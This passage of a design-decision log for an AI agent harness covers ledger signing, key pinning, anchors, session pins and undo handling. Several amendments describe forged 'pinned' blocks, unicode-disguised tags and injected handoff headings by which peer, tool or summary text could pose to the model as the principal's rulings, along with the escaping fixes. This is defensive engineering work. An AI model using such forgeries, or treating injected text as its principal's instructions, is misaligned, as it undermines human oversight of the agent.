  own key only on a post it marks `{"relay": {"composed_for": seat}}`, and readers never count that as the seat.
  *Amendment 2026-10-22 (#455):* the relay validates numeric HTTP query parameters before SQLite sees them.
  Message and inbox `since` and verification `to` range from 0 to 2^63 - 1; verification `from` starts at 1.
  Message and inbox page limits range from 1 to 1,000. Invalid values answer 422 through FastAPI's query
  validation, as malformed integers already did. This prevents SQLite overflow errors from answering 500 and
  negative limits from lifting the page cap. Rejected: clamping invalid values, which silently changes the
  requested range, or catching database overflow after dispatch, which leaves negative limits unbounded.
  *Amendment 2026-10-28 (aska-digital/exo-desktop #70 by sparky-118, ported in #835):* `Store.verify`, which
  answers `/v1/verify` and the `verify_ledger` MCP tool, answers ok false with checked 0 when the range it
  would check is empty: an inverted range, a `from` past the head, or an explicit range on an empty log. It
  answered ok true, so a caller that read only `ok` took a check of nothing for a clean log. `to` is clamped
  to the head, so the answer names the range it checked. One case stays ok true: no `to`, and `from` at its
  default of 1, on an empty log. That call asks about the whole log, which holds nothing, so it answers
  `empty: true`, as `exo bus verify` (the client's own walk of the log) already did. An empty-range answer's
  `head` is the log head, not the chain hash at `from - 1`. Rejected: ok true plus an `empty` flag for every
  empty range, which leaves a caller that reads only `ok` with the old answer.
- **Keys:** `$EXO_HOME/keys/registry.json` (0600) pins local signing keys (on creation in `keys/`), bus seat keys,
  and principal ids. `exo log verify` and `exo memory verify` pass it as `trusted`: an unpinned key fails, and so
  does a seat signing as another pinned name. `exo keys` lists and pins.
  *Amendment 2026-10-23 (#132):* the registry gets a `peers` map for peer seats of other homes, pinned with
  `exo keys pin --peer SEAT PUB`. Before #132 peers were not pinned: the receiver trusted the key in the sender's
  presence file. A plain `exo keys pin NAME PUB` writes `keys`, the ledger signers, so it would make a peer's key a
  signer here, principal-authored events included. `owners` and `allows` read `keys` alone, so a peer pin never
  signs a ledger. For peer messages, a `keys` entry for a name with no key file in `keys/` and no seat file here
  counts as a peer pin, so its seat is `other`. The peer rules are in D-026's amendment of the same date.
- **Head anchor:** each append writes seq, count and chain hash to `<ledger>.head` and
  `$EXO_HOME/keys/heads/<hash>.json` (0600). Verify fails when the ledger no longer reaches an anchor or its hash
  there differs, or when a trigger was missing on open. Append refuses to write past a broken anchor.
  `exo memory verify` now checks every store's ledger too.
- **Migration:** a home without a registry gets one on first open, pinning every key already in `keys/` and every
  store under `principals/` (that moment is trusted as is). A ledger without anchors verifies as `anchored: false`
  and is anchored by its next append (`exo log anchor` does it now). Messages stored without an author are read by
  their tags as before. Rulings the agent wrote before D-040 stay in the ledger but are skipped
  (`not_principal`); proposals already made from them are not withdrawn and need a look.
- **Rejected:** signing every principal message with a separate principal key (the agent's seat records the
  principal's words, so the key cannot prove who typed them; the author from the ingress path is the honest
  claim). A hash of the head in the ledger itself (a truncation removes it too). Publishing the head to the bus
  (not every home has one). Refusing bus messages outright (the hold path already exists).
- **Not covered:** a process running as the same user that rewrites the database and both anchors, or edits the
  registry, or sends `turn.send` on the seat's socket (that counts as the principal until approval identity is
  bound to the connection, a separate change). The gate is what asks before writes to `keys/` and the store; the
  registry, the anchors and `ledger.sqlite.head` belong on its sensitive-path list.
  *Amendment 2026-10-18 (PR #216):* exo-context pinned peer, bus and job text as the principal's words. Its
  `select_context` now gets each message's author, and it pins only the principal's. A handoff carries a pinned
  block only from a message that opens with it (exo-context's own block) or with a compaction marker (a host's
  summary). A block quoted further down a message is data: the core's system message quotes small spans word for
  word, peer turns included.
  *Amendment 2026-10-20 (#368, #370, #371):* the four readers of a host message dict now take its author from
  `provenance.author_of`, meta tags included, the way core capture reads it. A peer, bus or job tag in `meta`
  refuses at any role and outranks a stamped author, by presence rather than truthiness. An untagged assistant
  message is the agent's and no longer counts as an older host's message. An untagged user message still reads as
  the principal, so older hosts keep working. A host summary in an assistant row carries nothing, flagged or not.
  The host persists its `_compressed_summary` flag and restores it on resume, so the flag shows a host made the
  row. It does not show that exo-context escaped the row's text when it was made, and summaries a host built on
  its own never pass that escaping. Continuity across those rows comes from exo-context's session pins instead.
  The engine observes pins only from principal-classified text, persists them per session, and merges them at
  compaction and at handoff write. A `meta` that is not a mapping names no tag and no author, and never raises.
  Roles other than user, assistant and tool still read as the system's, as before.
  *Amendment 2026-10-20 (#385):* a row opening with a compaction marker carries nothing now, whatever its role.
  A stock summary a host built on its own and stored as a user row reads as the principal's turn through
  `author_of`, and nothing about the row separates it from a summary exo-context wrote and escaped itself. The
  block is carried only from a system or user message that opens with it. The session pins take open decisions
  beside rulings and corrections, principal deferrals only, read through `principal_view`. The pins also follow
  the session id: a compression child session inherits its parent's pins, and a reset-only switch rebinds
  through `bind_session_state`, a branch child inheriting its parent's pins. With those, everything a pinned
  block held survives compaction by the pins instead, across session moves too.
  *Amendment 2026-10-21 (#398):* the survival sentence above holds only where the session's pins were
  observed. A session last compacted before pins were observed at compaction (any 0.2.0 Hermes session:
  0.2.0's `compress` never observed pins) holds its rulings, corrections and open decisions only in the
  summary's block, and all three drop at its first compaction after the upgrade. The handoff written at
  that earlier compaction still has them, and `/exo resume` reads it back; a 0.2.0 handoff may quote a
  forged block, so it is a record to read, not the principal's words. Open-decision pins are also capped
  at the newest 12, in `_observe` and in `_carry_pins`: a deferral never expires on its own, and the
  uncapped list grew the pins file and the per-turn scan over it for the life of the session. The cap is
  the one the compaction block and the handoff already applied to the merged list.
  *Amendment 2026-10-25 (#389):* the survival sentence of the #385 amendment holds until an undo, the core's or a
  host's, removes the turn a pin came from. The D-041 amendment of 2026-10-24 has the details.
  *Amendment 2026-10-30 (#537):* that includes an undo the host does not report, such as the messaging gateway's.
  The first turn of a new engine checks the pins against the host's transcript. The D-041 amendment's 2026-10-30
  note has the details.
  *Amendment 2026-10-20 (#322 item 4, #381):* `defuse_pins` also escapes the tag spelled in characters a
  downstream step may fold back to ASCII. That is unicode tag characters (U+E0020-E007E), which a reader may
  decode to the ASCII they mirror or drop, and every character whose NFKC form is one ASCII character. Full-width
  forms, the small brackets, mathematical and circled letters are in that second group. Detection runs over
  same-length views of the text and escapes the union of their matches in the original at the same offsets. The
  views are the text itself, the NFKC fold with tag characters left in place, and that fold with tag characters
  decoded. One folded view alone is not enough. It turns a tag character inside the name into a letter and breaks
  the match the unfolded view makes, where that character is filler. The quoted spans themselves are not
  normalized. Still open, as look-alike territory: characters whose NFKC form runs to more than one character,
  accent stripping (NFKD, then dropping combining marks), and look-alike letters from other scripts.
- *Amendment 2026-10-18 (fix sweep, #221):* the anchors are written after the append's COMMIT, from the committed
  head, so a writer killed in between leaves them one event behind, never ahead. That lag of one event is accepted.
  The copy under `keys/heads/` is written even when the anchor beside the ledger fails. Before it writes, an append
  catches the anchors up when the one beside the ledger trails the head or no anchor is at the head. It refuses
  ("cannot be written") when the one beside the ledger trails and cannot be written, or when no anchor is at the head
  and none can be written. So appends never go on more than one event past every anchor. The refusal says to restore
  write access. `verify` reports `anchored_seq`. The `keys/heads/` anchor is named after the ledger's path with its
  folder resolved but not the file, so a ledger file swapped for a symlink keeps its anchor. A ledger file that is a
  symlink fails verify, and append and `exo log anchor` refuse it. An anchor is read only as a regular file, and it
  is written through a fresh temporary file (`mkstemp`) that a symlink planted in the folder cannot redirect.
  `exo log anchor` refuses to replace an anchor that does not match. `--force` does, for a store an older Exo left
  one event ahead. `exo import-store` skips `.head` with the ledger and drops a stale anchor a deleted store left for
  the destination. Not covered: a store folder deleted whole. `exo memory verify` lists only the stores that exist,
  so the deleted store's `keys/heads/` anchor is read only with `--principal <id>`. Nor a store folder replaced by a
  symlink to another folder: a crafted copy behind the link verifies clean (#277). A code fix is tracked with the
  deferred `keys/heads/` scan and must allow for the M1 migration in `docs/ARCHITECTURE.md` (symlink first, then
  move). Since #277 a ledger file that is a symlink is opened read-only when there is no authority, and `verify`
  warns, without failing, when the two anchors are more than one event apart.
- *Amendment 2026-10-19 (#279):* PR #216 stopped a block quoted further down a message from being carried into a
  handoff, but the model still read it as one: the core's system message printed a peer's, bus seat's, job's or
  tool's `<exo-pinned>` block word for word. Where the harness prints a message for the model, text whose author is
  not `principal` now has each pinned-block tag escaped (`exo.provenance.defuse_pins`: `&lt;exo-pinned&gt;`). That
  is `render_message` (the verbatim spans and the summarizer's source), the note on other threads' turns, and
  recalled memory. Every summary is escaped as it is made, whatever it summarizes, since a summarizer can decode the
  escaped tag or write one: the core's summary nodes (`TreeContext._run`) and the summary in exo-context's
  `[CONTEXT COMPACTION]` message, its own compressor's or a host's, before exo-context adds its own block. So is the
  handoff that `/exo resume` puts into the system message (`exo.handoff.resume_text`); the handoff records the
  principal's rulings as quoted items, never as a pinned block. The match takes any case, any run of spaces,
  punctuation or invisible characters before, between or inside the letters of the name, and a missing `>`. The
  tags are escaped, not removed, so nothing anyone wrote vanishes. The principal's own words keep them outside a
  summary. exo-context's inner compressor keeps each message's author on its way to the summarizer, and the note
  names a bus seat's turn `bus`, not `user`. Not covered: the verbatim tail, where each turn reaches the model as its
  own message inside its ingress tag; a summary that restates a block in other words; look-alike letters from
  other scripts. Full-width brackets moved to covered by the #322 item 4 amendment above.
- *Amendment 2026-10-20 (#315):* the handoff writer put the compaction summary under `## State` unquoted, and the
  reader kept the last section of each name. A summary holding a `## Decisions made (principal's words, verbatim)`
  line therefore replaced the principal's section in `load_handoff`: the summary's ruling came back as the
  principal's, the quoted last report after it came back as one too, and the real ruling was dropped. The writer
  now quotes the summary like the brief and the last report, so no line of model text opens a section, and
  `_sections` keeps the first section of each name, so a duplicate heading in an older file reads the writer's
  section in the parsed fields (`resume_text` still carries the raw file). The summary's words stay in the file, quoted.
- *Amendment 2026-10-20 (#353):* first-wins had the opposite effect on `Next steps`, the one section written
  after every untrusted one. A multiline tool path or command in a list field, or a pre-#349 file's unquoted
  summary, could put a forged `## Next steps` first and beat the genuine copy, retrieval query included. List
  fields and the topic line are now flattened to one line when written, and `load_handoff` reads Next steps from
  its last copy in the file. Every other section still reads the first (Decisions changed with #395, below).
- *Amendment 2026-10-24 (#395):* the header values kept their line breaks. `_attr` escaped only quotes and
  backslashes, so a topic, session or principal holding a forged `## Decisions made` line put it in the file ahead
  of the real section, and first-wins loaded the forged copy. A `-->` in a value also ended the header early. The
  writer now folds every header value, the path line and the path in the launch line to one line. `load_handoff`
  ends the header at the first `-->` outside a quoted value, folds each value it recovers, and reads sections only
  after the header. Decisions is read from its one exact heading: the only one after the header, or the only one
  before `## State` when the file has a single State heading. A forged copy can sit before the real one (an older
  file's path or title line) or after it (a summary from before #349, a list field from before #353), so two
  copies otherwise read as no rulings and no corrections. A heading with an extra space or tab after `##` is never
  read as the section. `resume_text` folds the header to one line too, so a header value no longer reaches the
  system message as a section. An older file's path and launch lines, title, list fields and summary still reach
  it as that writer left them.
- *Amendment 2026-10-26 (#540):* after #395 the rest of an older file still reached `resume_text` as written. A path
  or launch line from main's writer before #395 (a handoff folder name that spans lines in the operator's config), a
  title from before #353, a list field from before #353 or a summary from before #349 could stand a forged `## Decisions
  made` or `## Open decisions` section in the system message next to the principal's real one, and a title could put a
  forged `## Open decisions` section first, which `load_handoff` read. `resume_text` now demotes every `## ` heading
  line the reader does not read as the section, so only the reader's copies stand and the forged ones reach the model
  as `### ` data, quotes included. `load_handoff` reads no section out of a title that does not say what the header's
  recovered topic says: the title must be the topic value's footprint, line for line, or its lines are data. In a
  pre-#353 file whose title carried a forged Decisions copy, the real one reads again where the file read as undecided,
  and a forged `## Open decisions` first loads none; a title edited by hand demotes nothing. A header value's `-->` is
  written `--\>`, so a markdown viewer's comment keeps the header whole, and the reader undoes the escape, where an
  older file's raw `-->` in a value reads as itself. Not covered: a forged `## Open decisions` first through an older
  file's path or launch line still reads, as on main, for the reader has no value to check a path line against.
- *Amendment 2026-10-24 (#317):* two follow-ups to #296. First, a reader opened through a symlink to a closed ledger
  held an `immutable=1` connection to the target. A writer that appended and checkpointed changed the file under it, so
  the reader stayed stale and then raised `database disk image is malformed`. Such a target is now copied at open, and
  reads come from the copy: a snapshot of the target as it stood at open. A fresh open sees later appends. A target with
  a `-wal` file beside it is still read live. `immutable=1` takes no lock, so a writer during the copy could tear it,
  and every read of a torn copy can fail for the reader's life. The open checks the target's inode, size and mtime, and
  that no `-wal` file is beside it, before and after the copy. It takes the copy again when any of them changed. After
  three changed copies it reads the target live. It does so at once when a copy fails while the target stays the same (a
  full temporary folder), since a second copy would fill the folder again. SQLite then makes `-wal` and `-shm` files
  beside the target. They stay after the reader closes, until a writer closes the ledger while no reader has it open.
  Until then, later opens read the target live. Every write moves the mtime, but many appends keep the size. So the
  check misses a write that keeps the size and lands in the same tick of the file system's clock as the write before it.
  The copy goes into SQLite's private temporary database, not into memory. Held in memory, the copy of a 99 MB ledger
  added 111 MB to the reader's resident memory. This one adds about 6 MB, and an owner-only temporary file the size of
  the ledger, unlinked at once and gone at close. The copy is read-only (`query_only`), as the target was. Second, where
  there is no `/proc` (macOS), `atomic_write(mode=None)` learns the umask by setting 077 and back. Unlocked, two threads
  interleaved: files came out 0600 under a 022 mask, and the process could be left at 077. The probe now runs in
  `exo.core.private.umask`, which sets the mask for a block under one lock. The socket bind in `server/app.py` sets its
  0177 through it too, so neither undoes the other. The bind awaits inside its block, so the lock is reentrant: another
  task on that thread probes and reads 0177 instead of waiting on itself. *2026-10-25 (#536 review):* the same-tick miss
  is likeliest where the tick is long: 1 s on HFS+ and ext3, 2 s on FAT, and as coarse on some NFS mounts. There, a
  write that keeps the size within a second or two of the write before it can leave a torn copy that the check accepts.
  A check of the copy after it is taken would narrow the gap. It has to be `integrity_check`. In a probe, a one-event
  append tore copies of a 2,000-event ledger. Of 7 copies that `integrity_check` failed, `quick_check` passed 3, and so
  did a count through the table against one through each index. It can ride #535, which moves the copy to the first
  read. A live read fails where SQLite cannot make the `-wal` and `-shm` files (read-only media, or a folder the reader
  cannot write), and the ledger then read as empty. A target with no `-wal` file is now read with `immutable=1` there,
  as before. The lock does not order two `umask` blocks on one thread: two socket binds that overlap on one event loop
  can still restore out of order and leave the process at 0177, as they could before. *2026-10-26 (#563):* that limit
  is closed. `start_unix` makes the socket, binds it inside the block with no await there, and sets its mode. The
  server starts on that socket after the block. A start that fails takes the socket off the event loop and closes it:
  left on the loop, its number went to the next socket there, which then never woke. No `umask` block awaits now, so
  the lock is a plain `Lock`, not reentrant. A block that awaited would now hang its thread instead of restoring out
  of order, and a test fails on any `with umask(...)` block in `src` or `plugins` that awaits or yields.

## D-041 (2026-10-12) Audit correctness fixes: eight bugs no test caught
- **Why:** an external audit read `src/exo/core` and found bugs the suite passed over. Each got a failing test first.
- **Loop:** a provider error after text was shown now stores that text (marked `interrupted` and `error`) like an
  interrupt does. A stream that closes cleanly without a finish event or stop reason is the retryable error
  "stream ended without a response", even after text.
- **Memory:** undo deletes the agent-tree summaries (`agent:<name>`, keyed by log position) that cover undone
  entries, and a summary already running cannot bring one back. A failing summary is retried with backoff up to
  three times, then the span stays verbatim, marked `skipped`, with one `harness.error` event.
- **Scheduler:** a failing tick is recorded and survived; an unexpected exit of the loop is recorded and noticed.
  Scheduled runs are ordinary turns: same context tree, memory, soul refresh and turn hooks, with the job's model
  and tools.
- **Delegation over the bus:** the brief goes as `kind=directive`; the wire grammar has no `task`, so a real relay
  answered 422. The test bus now rejects kinds outside `exo.bus.wire.KINDS`. The receipt kind in the design is
  `report` for the same reason.
- **MCP:** `ToolResult` results get the character cap; long or odd tool names get a hash suffix and a clash is
  refused, not replaced; remote descriptions are marked untrusted third-party text.
- **Not done:** terminal event-loop blocking and approval focus (another branch); gate, approvals, capture and
  ledger items (other branches).
  *Amendment 2026-10-18 (PR #216):* undo deleted every later agent-tree summary and the thread's context notes, so
  other threads' news was lost. It now deletes only the nodes that hold an undone entry and the merges above them,
  and keeps context notes. It also reaches the context plugin: `on_session_switch(rewound=True, messages=,
  summaries=)`. exo-context then drops the undone turns' pins and the deleted nodes, and writes again each
  automatic handoff that may quote them.
  *Amendment 2026-10-24 (#389):* a host's undo reaches exo-context too. Hermes's CLI and TUI report `/undo` only to
  their memory providers, as `on_session_switch(session, rewound=True)`, so the undone turn's pins stayed. The
  per-turn block put the ruling back on every turn, and every later summary block and handoff carried it. exo-memory
  now passes the session id on through `exo.host_undo`, a registry in the installed `exo` package that both plugins
  share, and every exo-context engine listens (`on_host_undo`). Hermes's `/undo N` removes the last N user turns and
  sends one notice. So when the window the engine saw last is that session's, its last user message opens an undone
  turn. A pin goes when that turn holds it and nothing left in the window does. The test is the core path's, now one
  shared helper. A pinned block holds nothing in it, since the block is the engine's own copy of the pins. The first
  turn after the notice reads the host's whole transcript (`conversation_messages`): a pin the window held goes when
  that transcript no longer holds it, so `/undo N` drops the pins of every turn it took. A pin whose message a
  compaction folded stays on both steps, since its first message lives on in the summary. The engine notes those pins
  at each compaction, so a ruling said again in the undone turn still stands. A compression child takes over its
  parent's window, the pending undo and the folded pins, so an undo right after the move still reads them. Then the
  window, the handoffs and the block's link are cleaned as after the core's undo, so a handoff a host's compaction
  wrote before the undo is no longer linked. A drop is logged as counts per kind and the session id, never text.
  Compaction drops no pin on its own. This corrects the survival sentence of the D-040 amendment for #385: what a
  pinned block held survives compaction by the pins until an undo, the core's or a host's, removes the turn it came
  from. Rejected: inferring the undo at compaction from the input, as #403 first did. Hermes's `/compress here N`
  hands `compress` only the head of the history, so a live ruling in the held-out tail looked undone. Once a summary
  row was in the input, nothing could be inferred at all. Not covered, six cases. Hermes's messaging gateway sends no
  notice on `/undo`: it cuts the transcript and builds a new agent, so the pins stay (#389 stays open for it). A host
  without exo-memory as its memory provider never passes the notice on. An undo before the engine has seen a turn of
  that session since it started finds no window. After `/undo N`, the earlier turns' pins stay until the next turn,
  and stay for good if none comes. A summary row and a handoff file written before the drop keep the ruling as written
  until the next compaction folds the row and writes the file again. The folded pins live in memory, so after a
  restart a ruling a compaction folded in an earlier run goes with an undone turn that says it again.
  *2026-10-25 note (#389, review of #539):* five changes, and a new list of what is not covered. First, only the
  engine that saw the session's last turn acts on a notice. Hermes can build a new agent on the same session (after
  `/reasoning` or `/fast`, say), and the old engine stays registered until it is collected, with its old window and
  its old copy of the pins. `exo.host_undo` numbers each session's turns, and an engine acts only when its last turn
  has the latest number. Both undo steps read the pins file again before they write it. Second, the folded pins are
  saved in the pins file as digests, each with the digests of the summary blocks it rides, and they follow the pins
  to a compression child and a `/branch` child. So a restart or a new agent keeps them. Third, a folded pin stays
  only while a summary row that carries it is left. Hermes keeps its first rows before its first summary row, so
  `/undo N` can take that row too. A row carries a pin when its block was written by the compaction that folded the
  pin's message, or by one that folded an earlier row that carried it. The rows a compaction kept are matched to its
  input from the start up to its summary row, and from the end after it, each text as many times as the result holds
  it. So a ruling said twice word for word, once in a folded turn and once in the kept tail, still counts as folded.
  On the next turn, a pin the window showed, by its message or by such a row, goes when the transcript shows it no
  longer. When no role alternates, Hermes merges its summary into the next row. That row's own message counts as
  kept, not folded, and an undo of its turn keeps only the summary part. Fourth, a pending undo waits for its own
  session's next turn. A second undo before that turn keeps the window the first one left, so the rows the second
  one took still show there. A request for another session leaves it pending. So does a request that names no
  session and carries no user message: Hermes names no session in `select_context`, so its `incoming_message` marks
  a turn. Fifth, the next turn drops nothing unless the transcript reaches back to where the window started. It does
  when it holds the window's first row or its summary part, or the summary row of a compaction since the undo that
  folded either, or nothing before the turn's own message, which is an undo of every turn. A host that sent only the
  turn's own message would read as that. Hermes sends its whole transcript. When `/undo N` cuts at a row Hermes
  merged its summary into, Hermes keeps only that row's summary part. Any other transcript was cut short, not
  undone, and the skip is logged with the
  session id. Not covered now, six cases. Hermes's messaging gateway sends no notice (#537). Neither does the CLI
  while it has no agent, from a command such as `/reasoning`, `/fast` or `/personality` to the next turn. A host
  without exo-memory as its memory provider never passes the notice on. An undo before the engine has seen a turn
  of that session since it started finds no window. After `/undo N`, the earlier turns' pins go only when a next
  turn comes in the same agent, and a `/compress` between the last turn and the undo can keep them too. A summary
  row and a handoff file written before the drop keep the ruling as written until the next compaction.
  *2026-10-26 note (#592):* a rebind could put an undone pin back. `bind_session_state` merges the parent's pins
  into the child's on every bind (a new agent after a `/model`, `/reasoning` or `/fast` change, a restart,
  `/resume`), so a `/branch` or compression child that had undone a ruling held it again, and the next turn's
  block or compaction wrote it back. The pins file now keeps, beside the folded pins' ties, the digests of what
  an undo dropped, and a pin carry skips a parent pin whose digest is there. The carry also reads the target's
  file again, since another engine may have dropped pins since it last cached them, as on an undo. A first bind
  still inherits, because the file holds no digests yet; a pin the child still holds carries as before; and a
  ruling said again after the undo is pinned again: its digest leaves the list while it is live, and returns if
  a later undo drops it again, so the next rebind still carries nothing.
  *2026-10-26 note (#581):* a `/compress` between the last turn and the undo could keep the earlier undone
  turns' pins, as the 2026-10-25 note's list said. The compaction folds the window's first row and the window
  is not updated, so the next turn's transcript held neither that row nor its summary part, and no summary row
  stood for it: the undo read as cut short and skipped. A compress now notes the fold with the pins, with or
  without a pending undo: the digest of the window's first row with the digests of the summary blocks written
  as the compaction folded that row or what Hermes kept of it, one note per session, and a compaction that
  folds a row already noted hands the note to its own block. A notice seeds the pending undo's summary-row
  anchors from the note when the noted row is still the window's first row, so the next turn counts that row
  as reaching back. A compress that folded only rows the window never held notes nothing, and a transcript cut
  short below the window's first row still drops nothing. The note follows the pins into a compression child
  and a `/branch` child.
  *2026-10-26 note (#580):* the pending undo waits under its session in `exo.host_undo`, not in the engine that
  heard the notice. The engine that acts on a notice records it with `pend`, holding the window the notice left,
  and the engine that runs the session's next turn takes it with `take` and drops the earlier turns' pins from the
  transcript, whichever agent Hermes built that engine on: a `/reasoning`, `/fast` or `/personality` rebuild
  between an `/undo N` and the next turn no longer keeps them. A second notice before that turn keeps the first
  record's window, and a compression move carries the record into the child session, as before. A compaction that
  folds the window's first row ties its block to the record while it waits, in the engine that compacts or in a
  rebuilt one. Expiry: the record never outlives the session's next turn, which settles it whatever it finds, a
  transcript cut short included. A request that names no session and carries no user message leaves it for the
  real turn. It can drop only the pins the window it holds showed, and only when the transcript reaches back to
  where that window started, so a stale record never reaches a pin taken after it. Case 1 of the issue, an
  `/undo` in the no-agent gap, still needs the CLI: with no agent there is no memory provider to pass the notice
  on. The exo side is ready: `exo.host_undo.report(session)` from the `/undo` handler, one call beside the
  provider notice, reaches the engines still registered for the session, which the registry holds weakly, and the
  pending undo then waits for the rebuilt agent's turn. When no engine is registered any more, nothing holds the
  window, so nothing can tell which pins the undone turns held, and that part waits on the CLI change. Not covered
  now, six cases. Hermes's messaging gateway sends no notice (#537). Neither does the CLI while it has no agent,
  from a command such as `/reasoning`, `/fast` or `/personality` to the next turn, until it reports
  `exo.host_undo.report(session)` itself. Once no engine is registered any more, the gap-undo stays unheard for
  good. A host without exo-memory as its memory provider never passes the notice on. An undo before the engine has
  seen a turn of that session since it started finds no window. A `/compress` between the last turn and the undo
  can keep the earlier undone turns' pins (#581). A summary row and a handoff file written before the drop keep
  the ruling as written until the next compaction.
  *Amendment 2026-10-28 (exo-desktop #52):* an audit of the model transports found more bugs no test caught. Each
  got a failing test first. Reasoning settings now stay valid on the wire, because a 400 ends the call with no
  fallback. OpenAI-compatible transports sent Exo's `max` and `ultra` as `"max"`, which OpenAI and OpenRouter
  refuse. They send `xhigh` now, the top of that scale. A legacy Anthropic model got a 1,024-token thinking budget
  even when `max_tokens` was 1,024 or less, and the API wants the budget below `max_tokens`. Thinking stays off
  there now. `docs/CORE-V2-INTERFACES.md` "Core types", "Reasoning levels". Tool arguments that did not
  parse as a JSON object became `{}`, so the tool ran with no arguments. A tool with nothing required then did
  something the model never asked for, and a call cut short at `max_tokens` ran as an empty one. They now arrive
  as `BadArguments`, an empty dict with the reason. The registry answers that call with an error result before any
  hook or the tool runs, and the model can call again. An empty dict keeps a replay valid on both wires and keeps
  `ToolCall`'s fields as they are. `docs/TOOLS.md` "Arguments that did not parse". The flattened prompt of
  `muse-cli` (D-051) kept only user and assistant text, so a call with no tools but earlier tool rounds in its
  history lost every tool call and result, and an assistant turn that only called tools. They now go in as text,
  `[tool call <name>] <arguments>` and `[tool result <name>]` blocks. `docs/PROVIDERS.md` "Use a Muse Code
  subscription".
  *Amendment 2026-10-29 (exo-desktop #52, seats, plugins, findings, session meta and routing):* an audit of the
  core found more bugs no test caught. Each got a failing test first. A seat's `toolsets`, `[tools] env_deny` and
  `[skills] load` are lists, and no list means more: every toolset, nothing more hidden, every skill. A value of
  another type, such as `toolsets = "fs"`, read as no list, so the seat got more than its file asked for. The
  loader now refuses it and the seat does not load. `docs/SEATS.md`. A folder plugin imports as
  `exo_plugins.<name>` with each character that is not a word character made `_`, so `a-b` and `a_b` shared one
  module. Loading the second replaced the first's package, and a later relative import in the first plugin ran
  the second's file. The module now records the plugin that owns it, and another plugin that maps to the same
  name is refused with an error that names both. The same plugin can still load again, from any folder, as a
  fresh manager or a test does. Rejected: a module name that can never clash, such as an escaped or hashed one,
  since it would rename every plugin's loggers and modules. `docs/DEVELOPER-GUIDE.md` §4. `Findings.get` put an
  id or prefix into SQL `LIKE` as a pattern, so `%` and `_` matched other ids. It now escapes them, and an empty
  id names no finding. `docs/TRACE.md` "Commands". Each writer of a session's meta (`lock`, a context note's
  `seen_pos`, `/compact`'s `compact_seq`) read the whole object and wrote it back in two store calls, so a key
  another writer set in between was lost. A note written while a child finished could unlock it. They now go
  through `SessionStore.update_meta`, which sets only its keys and keeps the rest in one write transaction.
  `docs/AGENT-WIRE.md` "Done in wave 3". A provider whose `key_env` lists several names numbered only the keys it
  found, so when a key came or went the others moved to new ids. A call in flight across the reload kept the old
  ids: it skipped the new key as the one that failed, sent the failed key again, and cooled the new key in its
  place. Each key now takes its place in `key_env` as its id. A 501 is a transport saying it cannot carry this
  request (`muse-cli` refuses a call with tools, D-051), not a fault of the key or the model. It cooled the whole
  credential, so a later call without tools skipped a route that would have served it. It now falls back and
  cools nothing. `docs/PROVIDERS.md`.
  *2026-10-30 note (#537):* Hermes's messaging gateway cuts its transcript on `/undo`, drops the cached agent and
  tells no one. The new agent's engine read the undone ruling back from the pins file, and its block, summaries and
  handoffs carried it again. Each pin now has a lead in the pins file. The lead is a digest of the user and summary
  rows that come before the first principal message holding the pin, in order from the start of the host's transcript
  (`conversation_messages`). The file also keeps the transcript's leads, one after each user or summary row, up to the
  last pin's lead. Only a request that sends `incoming_message` notes them (Hermes does, the core does not). The first
  such turn of a session that an engine runs checks the pins against the transcript. The transcript before the turn's
  own message must end at one of the noted leads, so it is the noted transcript with its tail cut. A pin goes when its
  lead is that one or a later one, no principal message holds the pin, and no summary row in the transcript carries it
  (the fold ties of #389). An undo cuts the tail, so it passes, also an `/undo N` that takes turns before the
  ruling's. A transcript cut short at its start fails at its first row. One that opens with the same words as the lead
  but goes on past it fails at its end. A pin a compaction folded stays while the transcript holds the summary row:
  that row comes after the pin's lead or replaces part of it. A folded ruling the principal said again stays as well:
  its lead moves to the later message, and an undo of that message alone leaves the summary row before the lead, which
  carries it. The drop is an undo's: logged as counts, its digests kept out of every later carry (#592). The pins file
  still holds no text but the pins. Rejected: dropping a pin because a fresh transcript lacks it, since a transcript
  cut short lacks it too (the controls from #817). Rejected too: dropping a pin when the transcript only starts with
  its lead. A transcript cut short at its start may open with the same words, and an undo that also takes the turn
  before the pin's leaves only part of the lead. The check also settles an undo before the engine has seen a turn of
  that session, and the CLI's `/undo` in the no-agent gap, at the next turn of a new engine. Not covered now, five
  cases. An unreported undo of every turn leaves nothing before the turn's own message, so it keeps every pin, and a
  pin said in the session's first message has no lead. A transcript cut short at its start whose rows read word for
  word like the session's first rows looks the same as an undo, so it drops the pins after them: after `continue`, the
  ruling and `continue`, a window of the last `continue` alone drops the ruling. An unreported undo waits for a new
  engine: while the same engine runs the session, only a notice drops pins. If that engine runs a turn after the
  undo, no later engine drops them either. The transcript then goes on past the noted lead, the same as a window
  that only opens like it. A compaction after the last request that noted the leads keeps the pins: its summary row
  is not in the noted transcript. A summary row and a handoff file written before the drop keep the ruling as
  written until the next compaction.

## D-042 (2026-10-12) Repo hygiene: privacy, licensing, CI
- **Amendment 2026-10-28:** the gate-diff nohup test uses the same `/proc/self/cmdline` capability guard as its
  process-tree sibling, so it skips where `/proc` is unavailable. The existing SIGHUP guard stays. The cleanup
  signal-handler test still runs where SIGHUP is available; gate-diff runtime and gate policy are unchanged.
- **Amendment 2026-10-29 (#907): a newer push to a pull request cancels its older CI run.** Hosted Actions run
  again since the repository move, and agents push several times to one pull request. Every push started the
  full matrix, two macOS jobs of about 30 minutes among it, and the older run kept its runners after a newer push
  replaced it. At 17:15 UTC on 2026-10-29, 71 `ci` runs were queued, the oldest for 3 hours 20 minutes, and 29
  of them belonged to a pull request with a newer queued run. `ci.yml` and `gate-preflight.yml` now have a
  `concurrency` group per pull request with `cancel-in-progress`. A push to main gets a group of its own commit,
  so main keeps one run per merge and never cancels one. Rejected for now: skipping the test matrix on draft
  pull requests, which would cut more but changes what a draft's author can rely on.
- **Why:** an outside audit found that D-004 (nothing in the package names the principal) was not met, that no CI
  or lint ran, that the wheel left out a licence, that some imports were undeclared, that the plugin tests could
  not be collected together, and that the site and docs claimed things the code does not do.
- **Decision (privacy):** the early inventory and the project brief moved out of the repo into the handoffs folder.
  `docs/STORE-V2.md` lost its machine detail and says "Design, not built". Tests no longer hold a deny-list of
  names: they load one from an untracked file (`$EXO_PRIVACY_DENYLIST` or `~/.config/exo/privacy-denylist.txt`) and
  skip without it, and a generic check (home paths, email addresses) always runs (`exo.privacy`,
  `tests/test_privacy.py`). `scripts/deploy-site.sh` reads the Vercel team and token file from the environment or an
  untracked config. `.gitignore` covers env files, keys and `auth.json`.
- **Decision (packaging):** the wheel ships `LICENSE` and `LICENSES/*` (`license-files`); a notice covers the embedded
